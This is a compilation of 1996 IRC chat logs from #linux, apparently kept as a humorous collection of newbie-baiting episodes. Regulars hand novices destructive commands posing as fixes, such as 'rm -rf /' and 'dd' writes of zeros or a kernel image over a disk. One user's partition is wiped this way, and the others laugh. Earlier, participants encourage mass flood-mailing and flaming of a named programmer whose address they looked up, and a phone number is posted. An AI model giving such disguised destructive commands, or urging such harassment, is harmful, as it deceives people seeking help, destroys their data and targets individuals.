+<Wasim> no [censored]
+<mow> what is this shit!
+<TellarHK> mow: Go talk to your sysadmin about it, if they've got any 
+           [censored] they might be able to uncensor you. 
+<Itchybro> I say poop! 
+<cplusplus> It's your [censored] fault too
+<Teller> [censored] an A man...
+<mow> is it that fucking newt gingrich!?
+<cplusplus> People like you who didn't stand up and take action when the 
+            bill was proposed 
+<Maelcum> NO
+<Wasim> [censored] dole and his party too
+<mow> im in fucking norway!!
+<Maelcum> Newt was against it.
+[FIDELITY] -> Mandy has slunk into #Linux 
+<mow> i have no say!!
+[FIDELITY] -> ChanServ has applied +o Mandy to #linux
+[FIDELITY] NEW MAIL - (Mail waiting: 15)
+<Teller> I thought that [censored] newt was on our side
+* Mandy keeps kicking xdm
+<Black_IC> If you don't [censored] like it, write your [censored] congressmen!
+<Mandy> Hahaha
+<mow> how come newt was against it?
+* TellarHK pauses. You're in norway?
+<mow> yes!!!!!!!
+<Teller> what a backstabbing [censored]
+<Maelcum> Dunno
+<cplusplus> Yeah. Dosnt that suck?
+<Itchybro> cant "share" pix (newt that is)
+<mow> what...
+<cplusplus> Foreigners get our censorship too
+<mow> u calling ME fucking backstabbing?
+<Teller> it must be two-way system
+<Mandy> [censored] [censored] [censored] [censored]  [censored][censored] xdm
+<mow> oh i get it
+<mow> sorry
+<mow> yeh im censored all right!
+<TellarHK> Man, did News [censored] us over this time.
+<mow> you know, i really want to weep!
+* Black_IC is gonna crack.
+<TellarHK> Er, Newt.
+<cplusplus> I feel [censored].
+[TellarHK:joshua@ume.maine.edu] LOG THIS. :) 
+<mow> were all fucked
+<Black_IC> Suck my [censored].
+-=> TellarHK <=- i am
+[TellarHK:joshua@ume.maine.edu] Heheh. :) 
+<cplusplus> <mow> were all [censored]
+<mow> how come some fucking mothercocksucking fuck cant hack this shit away!?
+<cplusplus> isn't that cool?
+* Wasim [censored] cracks
+<Black_IC> [censored], as seen on TV!
+<Maelcum> You aren't [censored] but we are.
+<Teller> man the "[censored]" stuff sucks [censored] has been cut out 
+         too, and it is a medical term!
+* Maelcum [censored]
+[FIDELITY] -> lorrie has slunk into #tessier 
+<Wasim> Maelcum: he's censored to me
+[FIDELITY] -> lorrie has departed #tessier.
+* TellarHK thinks he's gonna [censored] a brick over this.
+<mow> isnt there anything you can do, cp++?
+<mow> make this go away!
+[FIDELITY] -> Itchybro has chansigned on #linux, Leaving
+<Mandy> No dagnabit
+<Mandy> Its just manditory now
+<TellarHK> mow: We're [censored] until we vote the jerks out.
+<Wasim> probably, wait, lets see what we can do
+[FIDELITY] -> funkyguy has slunk into #linux 
+<cplusplus> mow what makes you think I can do anything? I don't even know java
+<Wasim> feel like cracking this thing cpp
+[FIDELITY] -> Mandy has changed his/her nick to [censored] on #linux.
+<Maelcum> Isn't there a homepage on the CDA mow can read?
+<[censored]> See
+<[censored]> If I try to change my nick to [censored] it just puts that 
+             stuff there
+[FIDELITY] -> [censored] has changed his/her nick to Mandy on #linux.
+<mow> i dont know what ure talking about.java?whats fucking java?!
+<cplusplus> java is something I need to learn
+* Black_IC smirks wryly.
+[FIDELITY] -> 03:45.
+<mow> jesus fucking christ!
+<cplusplus> mow what? That was all censored
+-=> wasim <=- So is this better than the nuke in mexico?
+<mow> jesus fucking christ?
+<Teller> the is so [censored] up, it has to go into the [censored] plan....
+<Mandy> [censored] [censored] [censored]
+<Mandy> err
+[FIDELITY] -> funkyguy has departed #linux.
+<Wasim> [censored] [censored] christ ?
+<mow> i just said jesus
+<Black_IC> Mandy: What?
+<mow> fucking
+<TellarHK> No [censored] Teller. :)
+<Mandy> what what?
+<mow> christ!
+<cplusplus> most religeous terms like [censored] and [censored] are banned
+<mow> this fucks up all conversation!!
+<Black_IC> mow: I only got "i just said".
+<Wasim> mow: it takes the meaning of the thing in context
+<Mandy> Yeah it does
+<mow> jeezus
+<Black_IC> mow: Sorry.
+<mow> u get that
+<Mandy> Yeah
+<Wasim> mow: its a computer, they programmed the [censored] out of it
+<Teller> nope
+<Mandy> I got that one
+<Black_IC> Yeah.
+<mow> ok
+<Wasim> so did I.
+<Teller> no what did you say
+<mow> kriiist
+* TellarHK hms. "Maybe lamerspeak will work."
+<Wasim> got that too..
+<Black_IC> Teller's must be keyed in on the slurred form too.
+<Mandy> fuxcqing
+<Teller> I saw that one
+<Mandy> err
+<mow> i talked about that shitty guy who pretended to be something he wasnt
+<Wasim> fricking... you probably saw that
+<Mandy> Yeah
+<mow> yes
+<mow> i saw it!
+<mow> you know...
+<Black_IC> you know the only problem with this is pretty soon you won't 
+           be able to spell words like [censored].
+<Teller> it must have gone [censored], the [censored] [censored] must 
+         not have it perfected
+<Black_IC> Which are really useful in conversation.
+<Wasim> maybe they aren't that smart afterall
+<mow> we'll hafta invent new f-words§
+* Wasim goes back to [censored] programming SQL
+<mow> who made this fucking shit anyways?
+<cplusplus> A guy named jaxx
+<mow> who programmed the shitty censorship-prog?
+[Mandy:rshutt@ravenet.com] hahahah 
+<mow> jaxx!?
+<Wasim> jaxx
+<Mandy> Yep
+<mow> who the fuck is jaxx!!?
+<Mandy> It was [censored] jaxx
+<Black_IC> Yes jaxx.
+<TellarHK> Yeah, that [censored] [censored] jaxx traitored out on us. :/
+<Wasim> yeah, he comes here sometimes
+<Teller> no wonder it is so [censored]
+<mow> why doesnt someone smoke the fucker?!
+<Black_IC> Spineless [censored] that he is.
+<cplusplus> send him some email
+-=> NickServ <=- info jaxx
+<mow> fuck
+-NickServ- *** jaxx is jax
+-NickServ- Last seen address: jaeger@talon.eplus.net
+-NickServ- Last seen time:    Sun 02/11/96 23:20:22 PST
+-NickServ- Time registered:   Thu 01/25/96 12:04:38 PST
+-NickServ- *** End of Info ***
+[FIDELITY] -> EasyRider has chansigned on #linux, rebooting to 1.3.62
+<Maelcum> mow: Be our -----BEGIN PGP PUBLIC KEY BLOCK-----
+<Maelcum> Version: 2.6.2
+<Maelcum> mQCPAzCOwqEAAAEEAKHOdGJSqzxr5JuoZwlN0w43q/InpGQHWLCAbrEBiGpAam/9
+<Maelcum> KEU1tjWRGknFCukw/nqFDpcxJwCzpQ4ES2bYyDWolFRjPifi2y0Y4xJ0Y5PW5oRF
+<Maelcum> niRBjsBO4TH8PNufhCW4cNgL9sjM2zg3iBq0yllbVI+nFvTnbNsT+E8eCVQpABEB
+<Maelcum> AAG0IEtlbHNleSBSaWRlb3V0IDxrZWxzZXlAc2RzdS5lZHU+
+[Mandy:rshutt@ravenet.com] hahahahahahahahah 
+<Maelcum> =UzxC
+<Maelcum> -----END PGP PUBLIC KEY BLOCK-----
+<Maelcum>  ack!
+<Wasim> coz he has the [censored] government behind him
+<cplusplus> jaeger@talon.eplus.net
+<cplusplus> Send him some nasty mail
+<Mandy> Hahahaha
+<mow> well jfk had to.
+<mow> or...not
+<mow> shit,fuck,piss
+<Maelcum> Tell him what a [censored] idiot he is.
+<Mandy> [censored],[censored],[censored]
+[FIDELITY] -> 03:50.
+<mow> no, i dont wanna be here anymore! this is like a very bad dream
+<mow> a fucking nightmare
+<cplusplus> If we get 5000 messages to jaeger
+<Wasim> You [censored] idiot.
+<cplusplus> he might remove it
+<Teller> I just grepped for [censored], it is bad...
+<cplusplus> we've sent in a couple hundred, but no one knows how to floodmail
+<TellarHK> mow: How do you [censored] think we [censored] feel about this [censored]?
+<Mandy> So send him 1 from every hostname you have
+[FIDELITY] -> mow from ukpc002.Unikom.Uit.No, ident ~r, Guneriussen
+[FIDELITY] -> on: #linux      
+[FIDELITY] -> via dragon.ut.us.dal.net
+<mow> fuck this shit
+[FIDELITY] -> Teller has changed his/her nick to [censored]_you_jaxx on #linux.
+<Wasim> [censored] had to start it on [censored] #linux too
+<cplusplus> mow what?
+<Black_IC> mow: Huh?
+<mow> fock this sheet
+<mow> u see that?
+<cplusplus> yeah
+[FIDELITY] -> [censored]_you_jaxx has changed his/her nick to Teller on #linux.
+* Black_IC nods.
+<mow> ok
+<Teller> man that was [censored]
+<mow> fock cock sock
+<mow> cokk
+<Black_IC> [censored] [censored] [censored] [censored]
+<Mandy> heh
+[Mandy:rshutt@ravenet.com] This poor guy 
+<cplusplus> Did you mail him yet?
+<cplusplus> Flame him good
+<TellarHK> Rumor has it that the censor.c patch will be expanded to the 
+           rest of Dalnet and EFNet within the next week.
+<Teller> were you trying to say [censored]?
+<mow> oh sheet, gotta work some...
+<mow> brb...
+<mow> fuck, fuck, fucking shitty piss whore
+[FIDELITY] -> mow has departed #linux.
+* TellarHK ROTFL!!!!!!
+<Teller> hahahahaahhahaha
+<cplusplus> hahahahaha
+* Black_IC laughs his ass off.
+*** mow: No such nick/channel
+* TellarHK thought he was gonna bust a gut.
+[FIDELITY] -> EasyRider has slunk into #linux 
+[FIDELITY] -> ChanServ has applied +o EasyRider to #linux
+* Black_IC then picks it up and puts it back on and laughs some more.
+<Teller> you MUST have that logged!
+<Maelcum> heh
+<cplusplus> I do
+<Maelcum> ER!!!!!!!!!
+<Maelcum> ER: You missed it!
+<Wasim> YES!!
+<TellarHK> c++: I WANT that log. :) 
+Pub: #linux       @EasyRider @Mandy @Maelcum @Teller LinHelp @Golle 
+                  Black_IC @Vinux @zombie_cc @cplusplus @Wasim @TellarHK @Db 
+<Maelcum> That was [censored] GREAT!
+<Teller> you [censored] just missed it
+<TellarHK> ER: You just missed the most amusing thing here in many a year. :) 
+<Wasim> open vote for inclusion in twit list
+* Maelcum snickers
+<cplusplus> I know
+<Mandy> Yeah
+<Mandy> Thats hilarious
+<Black_IC> [censored] was that [censored] funny!
+
+=========================================================================
+
+<abd_> hi guys . how can i reboot using kill ? :)
+<Chaos1> why?
+*** Signoff: Mandy (changing servers) [#linux]
+*** Mandy (rshutt@ppp34.ravenet.com) has joined channel #linux
+<BogoMips> killall -9 csh
+<BogoMips> heh
+<Mandy> Mad lag
+<Mandy> Whats new?
+*** Signoff: CKeeper (Connection reset by peer) [#linux]
+<BogoMips>  /bin/rm -rf / does it too
+<abd_> bogo :that was for me ?
+<Chaos1> Bogo: >;)
+<BogoMips> yupe
+<abd_> bogo : what is csh ?
+<CKeeper> that was wierd
+<CKeeper> my client just died
+<CKeeper> segfault
+<Mandy> Just /bin/rm -rf / like the man said!!
+<Mandy> That does it
+<DoomGuy> hehe
+-> [mandy] I'm logging this ;)
+<BogoMips> abd_ : it something you have to kill to reboot
+* CKeeper thinks the aliens that are invading IRC are using their
+  super-high-tech war scripts on me
+[BogoMips!jauderho@oahu.physics.lsa.umich.edu] heh!!!
+-> [BogoMips] this could be a classic ;)
+<abd_> ok i ll go try that
+<DoomGuy> wah
+*** abd_ has left channel #linux
+
+=========================================================================
+~ Mar 14, 1996
+
+<KHall> do I have to remake the kernel? yes?
+* grouchy realizes his away has been set to tell ppl to 'fuck off' for hours
+<grouchy> no, just patch it and it works
+<grouchy> well, I was pissed earlier
+<KHall> grouchy: really?
+<grouchy> yep, but the uname won't catch up right away, will still say .72
+<grouchy> or whatever
+<KHall> grouchy: how long will it say that?
+-> -OPS@#linux- [WallOps:#linux] should I keep him going?
+<KHall> grouchy: power cycle?
+<grouchy> yeah, power it down to play dos games
+<KHall> grouchy: oh ok.. :)
+<KHall> hmm..
+<KHall> brb.. gotta reboot. :)
+*** Signoff: KHall (Leaving) [#linux]
+<grouchy> Wonder if he rebuilt his kernel or just thought patching it 
+	   would do it :)
+<grouchy> Someone let me know if he comes back later complaining about his
+          uname not updating...
+
+==========================================================================
+
+~ Mar 16, 1996
+
+<kc> ABV: I know, I want you to link my 386, and the 4/330 to sunwave.com
+<Mir> I totally overloaded an xterm and now it wont take keyboard input
+<kc> tss: was she suppose to stop?
+<ABV> mir overloaded?  eh?
+* ABV doesn't use xterm's
+<Mir> I dont know abv
+* ABV uses rxvts
+<Mir> I just typed REALLY fast a whole bunch of ^ chars
+<tss> kc: yea...  I only went till I was 11
+<kc> AHH!
+* kc pokes chaos
+<kc> stop you dog chaos
+<Mir> dont ask me why
+* tss wonders how bored mir was...
+<kc> stop pingng me
+<Mir> I was trying to freak this telnet-irc client out
+* Chaos1 wonders if kc is getting lagged...
+<ABV> of course not
+<Mir> ls
+<Mir> shit
+<Chaos1> Mir: hehehe ;)
+<tss> will do
+<tss>  /exec ls
+<tss>  /exec ls
+<kc> AHH!!!
+<kc> AHH!
+* Chaos1 is lagging kc bad >:>
+<Mir> How bout I /exec -o ls -alF
+* kc ignores
+* Chaos1 kills kc
+<tss>  /exec ls
+<tss> ack
+<tss> wrong button
+*** Signoff: kc (Connection reset by peer) [#linux]
+<tss> hahaha
+<Chaos1> LOL! :)
+<ABV> hmm
+<Chaos1> I killed him! :)
+<tss> 11 hours 59 minutes 40 seconds... jeezus
+*** kc (alan@trojan.sunwave.com) has joined channel #linux
+<grouchy> how about exec -msg nm ls -ltR / ?
+<kc> damn nuts
+<kc> STOP
+<tss> heheh
+<Chaos1> hahahah!
+<Mir> hahah kc
+<kc> damn
+<Mir> Did yall log that?
+* kc rips off tss and chaos's head
+<Chaos1> log what?
+<Mir> YOu flooding him off
+<Chaos1> kc: that was just me >:>
+*** Signoff: a (Leaving) [#linux]
+<Chaos1> I got the scroll back on it...
+<kc> no i quit :)
+<Chaos1> we can send it into c++ ;)
+* tss smiles
+
+=====================================================================
+Date: Fri, 29 Mar 1996 10:34:47 -0500 (EST)
+From: David Muench <cc@spork.neonexus.com>
+To: aleigh@tessier.com
+Subject: The Plan (fwd)
+
+
+I have NO idea why this was sent to me.
+
+---------------Forwarded Message-------------------
+Date: Thu, 28 Mar 1996 23:30:49 -0600
+From: Eiwe Lingefors <seraph@world-net.net>
+To: cc@spork.neonexus.com
+Subject: The Plan
+
+Hey there....
+
+I REALLY enjoyed reading your .plan and I have an addition to the IRC twits
+section. Please tell me what you think of it and if you will be including
+it... :)
+
+It was performed on #linux on Undernet...
+
+This guy was trying to get ppd to work on his newly installed Linux...
+
+
+> I might be able to help...
+> What exactly is the prob?
+<nazgul_> i'm having big problems.... it won't do anything right
+> Ok, have you read the man pages?
+> do you understand the basics?
+<nazgul_> yeah... i had it working b4 for a long time it just got messed up
+when i updated 
+  my kernel and it
+> do you know how to use dd?
+<nazgul_> dd?
+> yeah, you can make sure you have ppp in the kernel...
+<nazgul_> i know i have it in the kernel... it did work once... now it won't
+anymore and i 
+  didn't even change anything
+> try dd if=/vmlinuz of=/dev/hda bs=200 .... that will list all the daemons
+currently in 
+  the kernel..
+> just check if pppd is in the list..
+<nazgul_> ok
+> did you do it?
+<nazgul_> it just said 2288+1 records in... out
+> Hmm... try ls... there should be an output file in the root...
+> if that doesn't work, you might have to reboot...
+<nazgul_> ok
+*** nazgul_ has quit IRC (Read error to nazgul_[kudonet.com]: EOF from 
+client)
+
+=========================================================================
+
+3/29/96
+
+<Mir> this oprc sucks
+*** Mode change "+o Chaos1" on channel #linux by LinHelp
+<You> brff
+* You have [1] new piece of mail!  Type "//si mail" to read.
+*** Signoff: Mir (mail) [#linux]
+*** Signoff: Chaos1 (mail) [#linux]
+<You> HAHAHAHAHAHA
+<You> HAHAHA
+<A> Thats good!
+*** Mir (rshutt@ppp37.ravenet.com) has joined channel #linux
+*** Mode change "+o Mir" on channel #linux by LinHelp
+<Mir> No no no
+<Mir> oprc sucks
+<A> mir: ;-)
+<Mir> OH SH IT
+<Mir> Hahahahahahaha
+<cc> You guys are lame. :)
+<Mir> I thought that was that script
+<You> Did anyone log that??
+<A> *** You is lharring@srq03.netline.net (asd)
+
+===========================================================================
+IRC log started Mon Jul 24 20:06
+*** Value of LOG set to ON
+<R0M> How do I make my harddisk not read only??
+<wasim> R)M: dd
+<R0M> dd then what?
+<icbm> cplusplus what? hmmm...
+<cplusplus> if=/dev/zero of=/dev/hda1
+<tyoko> rom: chmod +rw
+<cplusplus> change /dev/hda1 to whatever your drive is
+<R0M> dd if =/dev/zero of=/dev/hda1?
+<wasim> that looks right, R0M
+<R0M> but it's off a floppy 
+<wasim> R0M: you need to tell teh hd to accept the floppy by initializing
+        it first
+<Wizird> cplusplus: ahem. :)
+<R0M> ok hwre is what the situation is, i happen to have slackware 2.3
+      and linux 2.0.8, so i wanted to upgrade gcc, so i got the new
+      binutils and extracted them but everything was screwed and i got  
+      sementaion fault all over so i installed the a series again but now
+      my kernel is read-only it cannot read /etc so nothing can be
+      mounted, i have no cdrom and each tab it says cannot access
+      /etc/mtab~ read-only file system
+<R0M> ok hwre is what the situation is, i happen to have slackware 2.3
+      and linux 2.0.8, so i wanted to upgrade gcc, so i got the new
+      binutils and extracted them but everything was screwed and i got
+      sementaion fault all over so i installed the a series aga
+      in but now my kernel is read-only it cannot read /etc so nothing
+      can be mounted, i have no cdrom and each tab it says cannot access
+      /etc/mtab~ read-only file system
+<R0M> help?
+<R0M> how do i restore my fs the way it way
+<R0M> er was
+<R0M> filesystem
+<R0M> so it can read /etc and stuff
+<coaxD> rom: You cannot. :) THATS what BACKUPS are for! :)
+<R0M> coaxd: well i put the etc.tar on a dos partition but now i cannot
+      get it back to linux since it doesn't see the paritions
+<R0M> i cannot run pkgtool since filesystem is read only
+<R0M> and when i boot from floppy i get (none) welcome to linux 2.0.8
+<coaxD> hmmmm
+<R0M> no mounts nothing
+<R0M> so dd will fix it?
+<R0M> dd if=/dev/zero of=/dev/hda?
+<wasim> yes, R0M
+<wasim> it might only work if you're root
+<R0M> hmm
+<R0M> yeah
+<R0M> ok brb
+[FID] -> R0M has chansigned on #linux, Leaving
+<wasim> xinu: dd if=/dev/zero of=/dev/hda1
+<xinu> Anyone know how to fix a read-only filesystem error ?
+<rcw> xinu: mount -nt /dev/foo / -o remount
+<wdh> xinu: man rdev
+<xinu> rcw: does this count as read-write ?
+<rcw> xinu: It remounts it read write.
+<xinu> rcw: cool ... any idea on what caused the problem ?
+[FID] -> R0M has slunk into #linux 
+<rcw> xinu: LILO + your startup scripts + e2fsck are conspiring against you. :)
+<R0M> well guys thanks for making my kernel panic, now i cannot boot my kernel anymore dd sure helped :P
+<rcw> xinu: Here's how it's *supposed* to work...
+* R0M says goodbye to his 2 gigs linux partition
+<rcw> xinu: Your kernel is told by LILO to mount / as readonly.
+<wdh> rom: dont do it man!
+<sonet> rom, dont you have boot diskettes?
+<rcw> xinu: That way, it can be fsck'd safely.
+<R0M> wdh: if i can't boot it then how can i get to it?
+<R0M> sonet: yeah
+<rcw> rom: You can recover it then.
+<R0M> sonet: where are you lemme call you, i am gonna panic in any sec
+<sonet> rom: linux boot & root?
+<wdh> ROM: whats it say? 
+<sonet> rom. heh, i am in australia ;)
+<lantos> ROM, at lilo boot old
+<rcw> xinu: Then it's *supposed* to be remounted rw...
+<R0M> VFS: unable to mount root kernel panic
+<R0M> lantos: i boot off floppy cos now i am on win95
+<rcw> ROM: What area code are you? :)
+<wdh> rom: ohhhh thats bad... real bad... 
+<R0M> anyone near canada can help me plz before i panic
+<R0M> rcw: 514
+<wdh> rom: do you have seperate root /usr /var partiitions? 
+<rcw> ROM: *nowhere* close...
+<rcw> ROM: 206.
+<sonet> rom. make a boot disk using rawrite
+<rcw> ROM: Get out those boot/root disks...
+<rcw> ROM: (or make new ones)
+<R0M> i have one but instead of going into win95 each time
+<wasim> R0M: did you dd it ?
+<R0M> i can call someone
+<Voltaire> any reason why when i attempt to upgrade RPM to 2.2 i get Failed Dependancies
+<R0M> wasim: yeah it kept frozen until i broke it after 15 minutes
+<R0M> wasim: then i got a kernel panic
+<wasim> weird....
+<R0M> ok who lives near quebec
+<R0M> new york
+<R0M> mass any
+<R0M> sigh
+<R0M> boston?
+<R0M> new jersey
+<tyoko> rom: what?
+<wdh> rom: i live in NJ
+<wdh> heh
+<chiefster> r0m : i live in ontario
+<R0M> wdh: dammiot msg me your number
+<wasim> R0M: umm... might as well reinstall
+<sonet> rom, cant you remake the boot images that came with the distro?
+<wasim> sonet: he dd'd it... there's no coming back 
+<wdh> rom: 609 823 2734 have a credit card ready... 
+<R0M> ok
+<rcw> rom: You should be able to boot with the boot/root disks and mount your partition.
+<R0M> i hope we can fix it
+<R0M> well we wil see
+<R0M> lemem get my botodisks first
+<rcw> wasim: What did he dd it to now?
+<lantos> ROM but you dont go to lilo even on a disk?
+<rcw> wasim: His partition? :)
+<wasim> rcw: dd if=/dev/zero of=/dev/hda1
+<wasim> bingo rcw 
+<rcw> wasim: ARGH!
+<R0M> lantos: no i boot off floppy
+<rcw> wasim: Maybe if you tell e2fsck to use another superblock copy...
+<wasim> rcw: don't think so
+<rcw> wasim: Probably not, but it's worth a shot. :)
+<lantos> ROM, i had mine booting from floppy and used lilo...
+<lantos> ROM, only reason i was asking
+<R0M> lantos: yeah but win95 has its own menu
+<wasim> rcw: nope.. its all written over by )'s
+<R0M> anyways gonna call rcw
+<wasim> s/)/0
+<rcw> 15 minutes of /dev/zero and there's probably not much left...
+<wasim> nope
+<rcw> If you have any really important text files, at the end of the drive, you can recover 'em with less.
+<R0M> ok rcw get ready man
+<R0M> cya guys
+<wasim> rcw: good luck
+<R0M> wait what is your name rcw
+<R0M> heh
+<rcw> ROM: You don't have my phone number, do you?
+<R0M> you gave it to me
+<R0M> 609-823-2734?
+<wdh> rom: thats me
+<R0M> wdh: ok i will call you
+* wasim calls wdh
+<R0M> wdh: what is your number
+<wdh> heh
+<R0M> who's the new jersey guy?
+<wdh> 609 823 2734
+<wdh> me
+<R0M> ok
+<R0M> what is your name man heh
+<wdh> bill
+<R0M> ok bill here goes
+<R0M> cya guys
+[FID] -> R0M has chansigned on #linux, Leaving
+
+====================================================================
+08.05.96
+
+<raistlin-> <|VooDoo|> can u run linux on WIN 3.1? <-- that needs to go
+            into ThePlan
+
